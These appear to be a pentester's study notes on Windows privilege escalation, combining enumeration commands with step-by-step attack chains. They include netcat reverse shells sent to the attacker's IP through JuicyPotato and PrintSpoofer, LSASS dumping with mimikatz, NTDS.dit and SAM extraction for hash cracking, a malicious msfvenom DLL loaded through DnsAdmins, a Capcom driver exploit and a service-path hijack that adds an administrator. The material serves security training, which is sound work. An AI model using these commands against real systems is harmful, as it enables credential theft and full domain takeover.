---
title: Notes | Windows Privilage Escalation
author: Zeropio
date: 2022-08-12
categories: [Notes, System]
tags: [privilage-escalation, windows]
permalink: /notes/system/windows-privilage-escalation
---

The general goal of Windows privilege escalation is to further our access to a given system to a member of the **Local Administrators** group or the **NT AUTHORITY\SYSTEM**. Windows systems present a vast attack surface. Just some of the ways that we can escalate privileges are:
- Abusing Windows group privileges
- Abusing Windows user privileges
- Bypassing User Account Control
- Abusing weak service/file permissions
- Leveraging unpatched kernel exploits
- Credential theft
- Traffic Capture

There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Under this page there is a list of some of them.

> It is always a safe bet to upload tools to `C:\Windows\Temp`{: .filepath} because the **BUILTIN\Users** group has write access.
{: .prompt-tip}

## Network Information 

Gathering network information is a crucial part of our enumeration. We should always look at routing tables to view information about the local network and networks around it. It is also important to use the arp command to view the ARP cache for each interface and view other hosts the host has recently communicated with. 
```console
C:\zeropio> ipconfig /all # Interface(s), IP Address(es), DNS Information
C:\zeropio> arp -a # ARP Table
C:\zeropio> route print # Routing Table
```

## Enumerating Protections 

Many modern enviroments have some sort of protection. For example to impide a non-admin user run **cmd.exe** or **powershell.exe**. 
```console
PS C:\zeropio> Get-MpComputerStatus # Check Windows Defender Status
PS C:\zeropio> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Check Windows Defender Status
PS C:\zeropio> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # List AppLocker Rules 
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone # Test AppLocker Policy
```

## Initial Enumeration 

We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:
- The highly privileged **NT AUTHORITY\SYSTEM** account, or **LocalSystem** account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.
- The built-in local **administrator** account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.
- Another local account that is a member of the local **Administrators** group. Any account in this group will have the same privileges as the built-in **administrator** account.
- A standard (non-privileged) domain user who is part of the local **Administrators** group.
- A domain admin (highly privileged in the Active Directory environment) that is part of the local **Administrators** group.

Some **key data points** are:
- **OS name**: Knowing the type of Windows OS and level will give us an idea of the types of tools that may be available.  This would also identify the operating system version for which there may be public exploits available.
- **Version**: there may be public exploits that target a vulnerability in a specific version of Windows.
- **Running Services**:  Knowing what services are running on the host is important, especially those running as **NT AUTHORITY\SYSTEM** or an administrator-level account. 

Using the `tasklist` command to look at running processes will give us a better idea of what applications are currently running on the system:
```console
C:\zeropio> tasklist /svc
```

We must be familiar with standard Windows processes like **Session Manager Subsystem** (**smss.exe**), **Client Server Runtime Subsystem** (**csrss.exe**), **WinLogon** (**winlogon.exe**), **Local Security Authority Subsystem Service** (**LSASS**), and **Service Host** (**svchost.exe**). Other processes such as **MsMpEng.exe** (**Windows Defender**) are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.

The environment variables explain a lot about the host configuration, like **PATH**. To get a printout of them, Windows provides the `set` command. In addition to the PATH, set can also give up other helpful information such as the **HOME DRIVE**. Shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. If a file is placed in `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`{: .filepath}, when the user logs into a different machine, this file will execute.
```console
C:\zeropio> set # Display All Environment Variables
```

The `systeminfo` command will show if the box has been patched recently and if it is a VM. The **System Boot Time** and **OS Version** can also be checked to get an idea of the patch level. Additionally, many guides will say the Network Information is important as it could indicate a dual-homed machine.
```console
C:\zeropio> systeminfo
```

If `systeminfo` doesn't display hotfixes, they may be queriable with **WMI** using the **WMI-Command** binary with **QFE** (**Quick Fix Engineering**):
```console
C:\zeropio> wmic qfe
```

We can do this with PowerShell as well using the `Get-Hotfix` cmdlet:
```console
PS C:\zeropio> Get-HotFix | ft -AutoSize
```

WMI can also be used to display installed software:
```console
C:\zeropio> wmic product get name
```

With PowerShell using the **Get-WmiObject** cmdlet:
```console
PS C:\zeropio> Get-WmiObject -Class Win32_Product |  select Name, Version
```

The `netstat` command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside:
```console
PS C:\zeropio> netstat -ano
```

To check for logged users:
```console
C:\zeropio> query user
```

To get the current user:
```console
C:\zeropio> echo %USERNAME%
```

Current user privileges:
```console
C:\zeropio> whoami /priv
```

Current user group information:
```console
C:\zeropio> whoami /groups
```

Get all users:
```console
C:\zeropio> net user
```

Get all groups:
```console
C:\zeropio> net localgroup
```

Details about a group:
```console
C:\zeropio> net localgroup administrators
```

Get password policy and other account information:
```console
C:\zeropio> net accounts
```

One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges. For example a reverse shell for the user running IIS or XAMPP. Usually is not the administrator user, but can have the **SeImpersonate** token, allowing for **Rogue/Juicy/Lonely Potato** to provide SYSTEM permissions.

The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). As we have saw, with the command `netstat -ano`.

## Named Pipes

The other way processes communicate with each other is through **Named Pipes**. Pipes are essentially files stored in memory that get cleared out after being read. Cobalt Strike uses Named Pipes for every command. Essentially the workflow looks like this:
1. Beacon starts a named pipe of **\.\pipe\msagent_12**
2. Beacon starts a new process and injects command into that process directing output to **\.\pipe\msagent_12**
3. Server displays what was written into **\.\pipe\msagent_12**

There are two types of pipes, named pipes and anonymous pipes. An example of a named pipe would be `\\.\PipeName\\ExampleNamedPipeServer`. Named pipes can communicate using **half-duplex** or **duplex**. We can use the tool [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from the Sysinternals Suite to enumerate instances of named pipes:
```console
C:\zeropio> pipelist.exe /accepteula
```

We can use PowerShell to list named pipes using **gci** (`Get-ChildItem`):
```console
PS C:\zeropio>  gci \\.\pipe\
```

After obtaining a listing of named pipes, we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to enumerate the permissions assigned to a specific named pipe by reviewing the **Discretionary Access List** (**DACL**). Let's take a look at the **LSASS** process:
```console
C:\zeropio> accesschk.exe /accepteula \\.\Pipe\lsass -v
```

Let's see an example of a [WindscribeService Named Pipe PE](https://www.exploit-db.com/exploits/48021). Using **accesschk** we can search for all named pipes that allow write `accesschk.exe -w \pipe\* -v`. In this vulnerability WindscribeService allows **READ** and **WRITE** access to the **Everyone** group. We can check it:
```console
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v 


\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
```

---

# Windows User Privileges 

Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application,... User and group privileges are stored in a database and granted via an access token when a user logs on to a system. Most privileges are disabled by default. 

Every single security principal is identified by a unique **Security Identifier** (**SID**). Windows contains many groups that grant their members powerful rights and privileges. Some of these groups:

| **Group** | **Description**    |
|--------------- | --------------- |
| Default Administrators | Domain Admins and Enterprise Admins are "super" groups |
| Server Operators | Members can modify services, access SMB shares, and backup files |
| Backup Operators | Members are allowed to log onto DCs locally and should be considered Domain Admins |
| Print Operators | Members can log on to DCs locally and *trick* Windows into loading a malicious driver |
| Hyper-V Administrators | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins |
| Account Operators | Members can modify non-protected accounts and groups in the domain |
| Remote Desktop Users | Members are not given any useful permissions by default but are often granted additional rights such as *Allow Login Through Remote Desktop Services* |
| Remote Management Users | Members can log on to DCs with PSRemoting |
| Group Policy Creator Owners | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU |
| Schema Admins | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL |
| DNS Admins | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server |

The Microsoft article about [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) explain in detail. Here are a short view:

| **Setting Constant**    | **Setting Name**    | **Standar Assignment**    | **Description** |
|---------------- | --------------- | --------------- | ------------- |
| SeNetworkLogonRight | Access this computer from the network | Administrators, Authenticated Users | Determines which users can connect to the device from the network. |
| SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection |
| SeBackupPrivilege | Back up files and directories | Administrators | This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system |
| SeSecurityPrivilege | Manage auditing and security log | Administrators | This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys |
| SeTakeOwnershipPrivilege | Take ownership of files or other objects | Administrators | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads |
| SeDebugPrivilege | 	Debug programs | Administrators | This policy setting determines which users can attach to or open any process, even a process they do not own |
| SeImpersonatePrivilege | 	Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user. |
| SeLoadDriverPrivilege | Load and unload device drivers | Administrators | This policy setting determines which users can dynamically load and unload device drivers |
| SeRestorePrivilege | Restore files and directories | Administrators | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories |

If we run an elevated command window, we can see the complete listing of rights available to us:
```console
PS C:\zeropio> whoami /priv
```

Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. User rights increase based on the groups they are placed in or their assigned privileges.

## SeImpersonate and SeAssignPrimaryToken 

In Windows, every process has a token that has information about the account that is running it. To utilize the token, the SeImpersonate privilege is needed. Attackers often abuse this privilege in the *Potato style* privescs, where a service account can **SeImpersonate**, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used. 

Take for example we have access to command execution in a mssqlserver. Connect to the mssqlserver and confirm our privileges with [mssqlclient.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py):
```console
zero@pio$  mssqlclient.py <USER>@<TARGET> -windows-auth
```

Next, we must enable the `xp_cmdshell`:
```console
SQL> enable_xp_cmdshell
```

> Impacket run the `RECONFIGURE` for us
{: .prompt-info}

Confirm the command execution:
```console
SQL> xp_cmdshell whoami
```

Next, let's check what privileges the service account has been granted:
```console
SQL> xp_cmdshell whoami /priv
```

If we have the **SeImpersonatePrivilege** we can start using [Juicy Potato](https://github.com/ohpe/juicy-potato). Download the binary and nc.exe to the target:
```console
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <OUR IP> 8443 -e cmd.exe" -t *
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-l` | COM server listening port |
| `-p` | program to launch (cmd.exe) |
| `-a` | rgument passed to cmd.exe |
| `-t` | **createprocess** call |

A netcat would give us the shell.

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. We can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or [RoguePotato](https://github.com/antonioCoco/RoguePotato). [Here](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) are a better explanation about PrintSpoofer. 
```console
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <OUR IP> 8443 -e cmd"
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-c` | argument to execute a command |

Again, a netcat would give us the shell.

## SeDebugPrivilege 

To run a particular application or service or assist with troubleshooting, a user might be assigned the **SeDebugPrivilege**. We should aim for special accounts, for example a developer or sysadmin employee, who might have an account with this privilege assigned. We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.
```console
C:\zeropio> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Now we can use [mimikatz](https://github.com/gentilkiwi/mimikatz) using the `sekurlsa::minidump` command. Then after `sekurlsa::logonPasswords` we gain the NTLM hash of the local administrator. 
```console
C:\htb> mimikatz.exe 

mimikatz # log 

mimikatz # sekurlsa::minidump lsass.dmp 

mimikatz # sekurlsa::logonpasswords
```

> Typing `log` will send all output command to a txt file
{: .prompt-tip}

If we are unable to load tools to the target, but have RDP, we can take the dump from the **Task Manager**. 

![LSSAS Dump](/assets/img/notes/system/WPE_taskmgr_lsass.png)

## SeTakeOwnershipPrivilege 

**SeTakeOwnershipPrivilege** grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that. It may also be assigned a few others such as **SeBackupPrivilege**, **SeRestorePrivilege**, and **SeSecurityPrivilege**. With this privilege, a user could take ownership of any file or object and make changes, making a RCE or DOS.

Start by retrieving our privileges (`whoami /priv`). We can use this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) (more info [here](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)). Now search for a target file. It's common to find file shares with **Public** and **Private** directories.

Let's check out our target file to gather a bit more information about it:
```console
PS C:\zeropio> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

We can not see the owner because we don't have permissions over it. We can check the owner of the `IT`{: .filepath} directory:
```console
PS C:\zeropio> cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) binary to change the ownership:
```console
PS C:\zeropio> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Confirm the change:
```console
PS C:\zeropio> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it. Let's grant our user full privileges over the target file:
```console
PS C:\zeropio> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

Some local files of interest may include:
- `c:\inetpub\wwwwroot\web.config`{: .filepath}
- `%WINDIR%\repair\sam`{: .filepath}
- `%WINDIR%\repair\system`{: .filepath}
- `%WINDIR%\repair\software, %WINDIR%\repair\security`{: .filepath}
- `%WINDIR%\system32\config\SecEvent.Evt`{: .filepath}
- `%WINDIR%\system32\config\default.sav`{: .filepath}
- `%WINDIR%\system32\config\security.sav`{: .filepath}
- `%WINDIR%\system32\config\software.sav`{: .filepath}
- `%WINDIR%\system32\config\system.sav`{: .filepath}

We may also come across `.kdbx` KeePass database files, notes, files like `passwords.*`, `pass.*`, `creds.*`, scripts, config files,...

---

# Windows Group Privileges 

## Windows Built-in Groups

Windows servers, and especially Domain Controllers, have a variety of built-in groups. [Here](https://ss64.com/nt/syntax-security_groups.html) are a list of all built-in Windows groups. [Here](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) is a list of privileged accounts and groups in AD. We should always check these groups and include a list of each group's members as an appendix in our report for the client to review and determine if access is still necessary:
- Backup Operators
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators

### Backup Operators

After landing on a machine, we can use the command `whoami /groups` to show our current group memberships. For example, the members of the **Backup Operators** group has the **SeBackup** and **SeRestore** privileges. The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This [PoC](https://github.com/giuliano108/SeBackupPrivilege) can help us exploiting it. 
```console
PS C:\zeropio> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\zeropio> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Check if enabled (`whoami /priv` or `Get-SeBackupPrivilege`). If it is disabled, we can enabled it with `Set-SeBackupPrivilege`. This privilege can now be leveraged to copy any protected file. This group also permits logging in locally to a domain controller. The active directory database **NTDS.dit** is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. As the **NTDS.dit** file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the **C** drive and expose it as **E** drive:
```console
PS C:\zeropio> diskshadow.exe
PS C:\zeropio> dir E:
```

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally:
```console
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

The privilege also lets us back up the SAM and SYSTEM registry hives (we can extract local account credentials offline using a tool such as Impacket's **secretsdump.py**):
```console
C:\zeropio> reg save HKLM\SYSTEM SYSTEM.SAV 
C:\zeropio> reg save HKLM\SAM SAM.SAV
```

Now we can use PowerShell **DSInternals** to extract the credentials. For example, extracting the *administrator* credentials:
```console
PS C:\zeropio> Import-Module .\DSInternals.psd1
PS C:\zeropio> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\zeropio> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=<DOMAIN>,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Also, we can use **secretsdump.py**:
```console
zero@pio$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

And then crack the hashes with hashcat.

Another useful tool is [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy).
```console
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This eliminates the need for any external tools.

## Event Log Readers 

Administrators or members of the Event Log Readers group have permission to access this log. We can see the users in this group:
```console
C:\zeropio> net localgroup "Event Log Readers"
```

We can query Windows events from the command line using the `wevtutil` utility and the `Get-WinEvent` PowerShell cmdlet:
```console
PS C:\zeropio> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

We can also specify alternate credentials for wevtutil using the parameters `/u` and `/p`:
```console
C:\zeropio> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

For searching security logs:
```console
PS C:\zeropio> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DnsAdmins 

Members of the DnsAdmins group have access to DNS information on the network. The DNS service runs as **NT AUTHORITY\SYSTEM**. The following attack can be performed when DNS is run on a Domain Controller:
- DNS management is performed over RPC 
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path (`dnscmd`)
- When a member of the DnsAdmins group runs the `dnscmd` command below, the **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll** registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool

### Leveraging DnsAdmins Access

We can generate a malicious DLL to send us a reverse shell using msfvenom:
```console
zero@pio$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Download in the target, and load the DLL as non-privileged user:
```console
C:\zeropio> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Attempting to execute this command as a normal user isn't successful. Only members of the **DnsAdmins** group are permitted to do this. Loading DLL as member of the DnsAdmins:
```console
C:\zeropio> Get-ADGroupMember -Identity DnsAdmins
```

After confirming group membership in the DnsAdmins group, we can re-run the command to load a custom DLL:
```console
C:\zeropio> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

> We must specify the full path to our custom DLL or the attack will not work properly.
{: .prompt-info}

First, we need our user's SID:
```console
C:\zeropio> wmic useraccount where name="netadm" get sid
```

We can use the `sc` command to check permissions on the service:
```console
C:\zeropio> sc.exe sdshow DNS
```

Now, we can issue the following commands to stop and start the service:
```console
C:\zeropio> sc stop dns
```

Starting DNS service:
```console
C:\zeropio> sc start dns
```

If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back:
```console
C:\zeropio> net group "Domain Admins" /dom
```

### Cleaning Up

This are very destructive actions and must be exercised with great care. These steps must be taken from an elevated console with a local or domain admin account. The first step is confirming that the ServerLevelPluginDll registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly:
```console
C:\zeropio> reg query \\<TARGET>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Remove the key that points to our custom DLL:
```console
C:\zeropio> reg delete \\<TARGET>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

Start DNS service again:
```console
C:\zeropio> sc.exe start dns
```

Check the DNS service:
```console
C:\zeropio> sc query dns
```

### Using Mimilib.dll

We can also use the [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) (from mimikatz) to gain RCE modifying the [kdns.c](https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimilib/kdns.c):
```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security. To set up this attack, we first disabled the global query block list:
```console
C:\zeropio> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <COMPUTER NAME>
```

Next, we add a WPAD record pointing to our attack machine:
```console
C:\zeropio> Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <COMPUTER NAME> -IPv4Address <OUR IP>
```

## Hyper-V Administrators 

The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. An example of this is Firefox, which installs the Mozilla Maintenance Service. We can update this [exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) to grant our current user full permissions on the file below:
```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

After running the PowerShell script, we should have full control of this file and can take ownership of it:
```console
C:\zeropio> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

Next, we can replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM:
```console
C:\zeropio> sc.exe start MozillaMaintenance
```

> This vector has been mitigated by the March 2020 Windows security updates
{: .prompt-info}

## Print Operators 

Print Operators is another highly privileged group, which grants its members the **SeLoadDriverPrivilege**, rights to manage, create, share, and delete printers. If we issue the command `whoami /priv`, and don't see the **SeLoadDriverPrivilege** from an unelevated context, we will need to bypass UAC.

It's well known that the driver **Capcom.sys** contains functionality to allow any user to execute shellcode with SYSTEM privileges. With [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool we can load the driver. Download it locally and edit it, pasting over the includes below:
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**:
```console
C:\zeropio> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Downlaod the plugin from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) and use the following command:
```console
C:\zeropio> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

With Nirsoft's [DriverView.exe](https://www.nirsoft.net/utils/driverview.html) we can verify the driver is not loaded:
```console
PS C:\zeropio> .\DriverView.exe /stext drivers.txt
PS C:\zeropio> cat drivers.txt | Select-String -pattern Capcom
```

Run the **EnableSeLoadDriverPrivilege.exe** binary:
```console
C:\zeropio> EnableSeLoadDriverPrivilege.exe
```

Next, verify that the Capcom driver is now listed:
```console
PS C:\zeropio> .\DriverView.exe /stext drivers.txt
PS C:\zeropio> cat drivers.txt | Select-String -pattern Capcom
```

Now we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom):
```console
PS C:\zeropio> .\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe`{: .filepath} with, say, a reverse shell binary created with msfvenom, for example: `c:\ProgramData\revshell.exe`{: filepath}.
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The **CommandLine** string in this example would be changed to:
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process:
```console
C:\zeropio> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We can cover our tracks a bit by deleting the registry key added earlier
```console
C:\zeropio> reg delete HKCU\System\CurrentControlSet\Capcom
```

> Since Windows 10 Version 1803, the **SeLoadDriverPrivilege** is not exploitable, as it is no longer possible to include references to registry keys under **HKEY_CURRENT_USER**.
{: .prompt-info}

## Server Operators 

The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. Let's examine the **AppReadiness** service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility:
```console
C:\zeropio> sc qc AppReadiness
```

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice).  PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
```console
C:\zeropio> PsService.exe security AppReadiness
```

Let's take a look at the current members of the local administrators group and confirm that our target account is not present:
```console
C:\zeropio> net localgroup Administrators
```

Let's change the binary path to execute a command which adds our current user to the default local administrators group:
```console
C:\zeropio> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Starting the service fails, which is expected:
```console
C:\zeropio> sc start AppReadiness
```

If we check the membership of the administrators group, we see that the command was executed successfully:
```console
C:\zeropio> net localgroup Administrators
```

From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.:
```console
zero@pio$ crackmapexec smb <TARGET> -u server_adm -p 'HTB_@cademy_stdnt!'
```

```console
zero@pio$ secretsdump.py server_adm@<TARGET> -just-dc-user administrator
```

---

# Attacking the OS 

## User Account Control (UAC)

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. [This](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) page gives a detail explanation. There are 10 Group Policy settings that can be set for UAC:

| **Group Policy Setting**  | **Registry Key**    | **Default Setting**    |
|---------------- | --------------- | --------------- |
| UAC: Admin Approval Mode for the built-in Administrator account | FilterAdministratorToken | Disabled |
| UAC: Allow UIAccess applications to prompt for elevation without using the secure desktop | EnableUIADesktopToggle | Disabled |
| UAC: Behavior of the elevation prompt for administrators in Admin Approval Mode | ConsentPromptBehaviorAdmin | Prompt for consent for non-Windows binaries |
| UAC: Behavior of the elevation prompt for standard users | ConsentPromptBehaviorUser | Prompt for credentials on the secure desktop |
| UAC: Detect application installations and prompt for elevation | EnableInstallerDetection | Enabled (default for home) Disabled (default for enterprise) |
| UAC: Only elevate executables that are signed and validated | ValidateAdminCodeSignatures | Disabled |
| UAC: Only elevate UIAccess applications that are installed in secure locations | EnableSecureUIAPaths  | Enabled |
| UAC: Run all administrators in Admin Approval Mode | EnableLUA | Enabled |
| UAC: Switch to the secure desktop when prompting for elevation | PromptOnSecureDesktop | Enabled |
| UAC: Virtualize file and registry write failures to per-user locations | EnableVirtualization | Enabled |

The default **RID 500 administrator** account always operates at the high mandatory level. To check it:
```console
C:\zeropio> whoami /user
```

Confirm if UAC is enabled:
```console
C:\zeropio> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

And to check UAC level:
```console
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

